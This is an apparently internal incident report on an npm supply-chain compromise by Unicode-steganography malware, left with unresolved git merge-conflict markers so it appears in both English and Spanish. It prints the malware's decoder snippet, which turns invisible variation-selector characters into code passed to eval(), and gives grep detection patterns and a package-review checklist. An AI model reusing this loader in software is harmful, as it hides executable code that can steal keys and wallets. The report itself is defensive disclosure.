<<<<<<< HEAD
# Sovereign Security Report: Operation "Total Cleanup"
## System Status: CERTIFIED CLEAN (Phase 4)

This document certifies the eradication of the **Glassworm** malware from the Q-AION ecosystem and establishes the new security doctrine for Phase 4.

### 1. Purge Summary
- **Eradicated Infections:** 686 attack points (Unicode Variation Selectors and Tags).
- **Removed Components:**
  - `mission-control` (Local): Permanently excised as the primary NPM infection vector.
  - `openclaw` / `openclawd` (Local): Removed due to dependency compromise.
- **Sanitized RAM:** All zombie processes on ports 3000, 18789 and 8000 have been terminated.

### 2. Active Defense Infrastructure
To prevent reinfections, three shielding layers have been deployed:

| Component | Function | Location |
| :--- | :--- | :--- |
| **Core Sanitizer** | Unicode interceptor in NPU inference. | `core/local_model_node.py` |
| **Unicode Sentinel** | Permanent surveillance every 10 min. | `scripts/ghost_watchdog.py` |
| **Forensic Scanner** | Deep audit tool. | `scripts/forensic_scanner.py` |
| **Purifier** | Immediate remediation tool. | `scripts/ghost_purge.py` |

### 3. Sovereignty Protocol (Phase 4)
"The Node That Never Calls Home".
1. **Local Inference:** The use of external APIs for critical trading reasoning is prohibited. All thinking happens on the MacBook M4 Max via MLX/Ollama.
2. **Text Validation:** No instruction (prompt) is processed without passing through the `sanitize_text()` filter.
3. **Port Control:** Only authorized ports are allowed (`11434` for Ollama, `5001/5002` for the Mesh Agent).

### 4. Security Log Locations
- `/Users/jquiceva/equipo-de-agentes/logs/ghost_watchdog.log`
- `/Users/jquiceva/equipo-de-agentes/logs/execution_log.jsonl`

**Certified by Antigravity — Technical Executive.**
*For the attention of the Commander and the Legion.*

---

## Incident #2: OpenClaw npm Supply Chain Attack (2026-03-26)

### Discovery
**Unicode Steganography** malware was identified in the `openclaw` npm package:
=======
# Informe de Seguridad Soberana: Operación "Limpieza Total"
## Estado del Sistema: CERTIFICADO PURO (Fase 4)

Este documento certifica la erradicación del malware **Glassworm** del ecosistema Q-AION y establece la nueva doctrina de seguridad para la Fase 4.

### 1. Resumen de la Purga
- **Infecciones Erradicadas:** 686 puntos de ataque (Unicode Variation Selectors y Tags).
- **Componentes Eliminados:** 
  - `mission-control` (Local): Extirpado permanentemente por ser el vector primario de infección NPM.
  - `openclaw` / `openclawd` (Local): Eliminado por compromiso de dependencia.
- **RAM Sanitizada:** Todos los procesos zombis en los puertos 3000, 18789 y 8000 han sido aniquilados.

### 2. Infraestructura de Defensa Activa
Para prevenir reinfecciones, se han desplegado tres capas de blindaje:

| Componente | Función | Ubicación |
| :--- | :--- | :--- |
| **Sanetizador de Núcleo** | Interceptor Unicode en la inferencia NPU. | `core/local_model_node.py` |
| **Centinela Unicode** | Vigilancia permanente cada 10 min. | `scripts/ghost_watchdog.py` |
| **Escáner Forense** | Herramienta de auditoría profunda. | `scripts/forensic_scanner.py` |
| **Purificador** | Herramienta de remediación inmediata. | `scripts/ghost_purge.py` |

### 3. Protocolo de Soberanía (Fase 4)
"The Node That Never Calls Home" (El Nodo que Nunca Llama a Casa).
1. **Inferencia Local:** Se prohíbe el uso de APIs externas para razonamiento crítico de trading. Todo el pensamiento sucede en el MacBook M4 Max via MLX/Ollama.
2. **Validación de Texto:** Ninguna instrucción (prompt) es procesada sin pasar por el filtro de `sanitize_text()`.
3. **Control de Puertos:** Solo se permiten puertos autorizados (`11434` para Ollama, `5001/5002` para el Mesh Agent).

### 4. Ubicación de Logs de Seguridad
- `/Users/jquiceva/equipo-de-agentes/logs/ghost_watchdog.log`
- `/Users/jquiceva/equipo-de-agentes/logs/execution_log.jsonl`

**Certificado por Antigravity — Technical Executive.**
*A la atención del Commander y la Legión.*

---

## Incidente #2: OpenClaw npm Supply Chain Attack (2026-03-26)

### Descubrimiento
Se identificó malware de tipo **Unicode Steganography** en el paquete `openclaw` de npm:
>>>>>>> 4e63386 (refactor: organize repo into professional structure)
```javascript
const s = v => [...v].map(w => (
  w = w.codePointAt(0),
  w >= 0xFE00 && w <= 0xFE0F ? w - 0xFE00 :
  w >= 0xE0100 && w <= 0xE01EF ? w - 0xE0100 + 16 : null
)).filter(n => n !== null);
eval(Buffer.from(s(``)).toString('utf-8'));
```

<<<<<<< HEAD
**Technique:** Variation Selectors Unicode (U+FE00-FE0F, U+E0100-E01EF) — invisible characters that decode to executable code via `eval()`.

### Impact
- Mission Control (Next.js) depended on OpenClaw as a gateway
- OpenClaw had potential access to the `.env` (API keys, private keys, wallets)
- The chat Coordinator returned: "delivery to the live coordinator runtime failed"

### Actions taken
1. ✅ Total removal of OpenClaw and Mission Control Next.js
2. ✅ Replaced by Streamlit dashboard (zero npm dependencies)
3. ✅ Telegram bot reconfigured with direct DeepSeek API
4. ✅ OCI CLI installed as native replacement for cloud management
5. ✅ Wallet audit — Q-AION wallet recovered from `.q_aion_vault.key`

---

## Dependency Policy — POST INCIDENT

### ABSOLUTE RULE: Zero npm in production

The DOF system operates **without npm in the critical path**. Reasons:
- npm has a history of supply chain attacks (event-stream 2018, ua-parser-js 2021, OpenClaw 2026)
- Node.js `eval()` + Unicode = invisible attack vector
- Python stdlib + audited pip is sufficient for the entire system

### APPROVED Dependencies (Python pip)

| Package | Author | Function |
=======
**Técnica:** Variation Selectors Unicode (U+FE00-FE0F, U+E0100-E01EF) — caracteres invisibles que decodifican a código ejecutable vía `eval()`.

### Impacto
- Mission Control (Next.js) dependía de OpenClaw como gateway
- OpenClaw tenía acceso potencial al `.env` (API keys, private keys, wallets)
- El Coordinator del chat devolvía: "delivery to the live coordinator runtime failed"

### Acciones tomadas
1. ✅ Eliminación total de OpenClaw y Mission Control Next.js
2. ✅ Reemplazo por Streamlit dashboard (zero npm dependencies)
3. ✅ Telegram bot reconfigurado con DeepSeek API directa
4. ✅ OCI CLI instalado como reemplazo nativo para cloud management
5. ✅ Auditoría de wallets — wallet Q-AION recuperada de `.q_aion_vault.key`

---

## Política de Dependencias — POST INCIDENTE

### REGLA ABSOLUTA: Zero npm en producción

El sistema DOF opera **sin npm en el critical path**. Razones:
- npm tiene historial de supply chain attacks (event-stream 2018, ua-parser-js 2021, OpenClaw 2026)
- Node.js `eval()` + Unicode = vector de ataque invisible
- Python stdlib + pip auditado es suficiente para todo el sistema

### Dependencias APROBADAS (Python pip)

| Paquete | Autor | Función |
>>>>>>> 4e63386 (refactor: organize repo into professional structure)
|---------|-------|---------|
| `web3` | Ethereum Foundation | Blockchain |
| `requests` | PSF | HTTP |
| `pyyaml` | PyYAML org | Config |
| `playwright` | Microsoft | Browser automation |
| `streamlit` | Snowflake | Dashboard |
| `z3-solver` | Microsoft Research | Formal verification |
| `oci-cli` | Oracle | Cloud management |

<<<<<<< HEAD
### Before installing ANY new package

1. **Who maintains it?** — verified organization or random individual?
2. **Review source code** — look for `eval(`, `exec(`, `os.system(`, `subprocess`
3. **Check for invisible Unicode** — `cat -v file.js | grep -P '[\x80-\xFF]'`
4. **NEVER `curl | bash`** — always download, read, then install
5. **Lock versions** — `pip freeze > requirements.txt`

### Detecting Unicode Steganography
```bash
# Search for Variation Selectors in any file
grep -rP '[\x{FE00}-\x{FE0F}]' .
# Search for eval with template literals
grep -rn 'eval(.*\`' .
# Search for Buffer.from with encoding
grep -rn 'Buffer.from.*toString' .
```

### Sovereign principle
> If we cannot read the complete source code, we do not use it.
> Direct APIs > intermediary gateways.
> Python stdlib > npm ecosystem.

---
*Updated: 2026-03-26 — Post OpenClaw incident*
=======
### Antes de instalar CUALQUIER paquete nuevo

1. **¿Quién lo mantiene?** — organización verificada o individuo random?
2. **Revisar código fuente** — buscar `eval(`, `exec(`, `os.system(`, `subprocess`
3. **Buscar Unicode invisible** — `cat -v file.js | grep -P '[\x80-\xFF]'`
4. **NUNCA `curl | bash`** — siempre descargar, leer, luego instalar
5. **Lock versions** — `pip freeze > requirements.txt`

### Detección de Unicode Steganography
```bash
# Buscar Variation Selectors en cualquier archivo
grep -rP '[\x{FE00}-\x{FE0F}]' .
# Buscar eval con template literals
grep -rn 'eval(.*\`' .
# Buscar Buffer.from con encoding
grep -rn 'Buffer.from.*toString' .
```

### Principio soberano
> Si no podemos leer el código fuente completo, no lo usamos.
> APIs directas > gateways intermediarios.
> Python stdlib > npm ecosystem.

---
*Actualizado: 2026-03-26 — Post incidente OpenClaw*
>>>>>>> 4e63386 (refactor: organize repo into professional structure)
